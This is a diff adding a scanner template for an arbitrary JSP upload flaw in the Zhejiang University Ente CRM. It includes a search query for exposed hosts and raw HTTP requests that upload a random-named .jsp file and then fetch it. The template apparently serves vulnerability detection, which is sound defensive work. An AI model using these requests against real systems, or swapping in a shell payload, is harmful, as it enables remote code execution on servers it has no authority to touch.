@@ -1,0 +1,33 @@
+id: zjuedu-webshell-upload
+
+info:
+  name: 浙大恩特客户资源管理系统fileupload.jsp文件上传漏洞
+  author: rain
+  severity: high
+  description: 浙大恩特客户资源管理系统中的fileupload.jsp接口存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。该漏洞可能会对系统的完整性和安全性产生严重影响。
+  metadata:
+    fofa-query: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+http:
+  - raw:
+      - |
+        POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{file_name}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Content-Length: 12
+
+        {{file_content}}
+      - |
+        GET /enterdoc/uploadfile/{{file_name}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{file_content}}")'
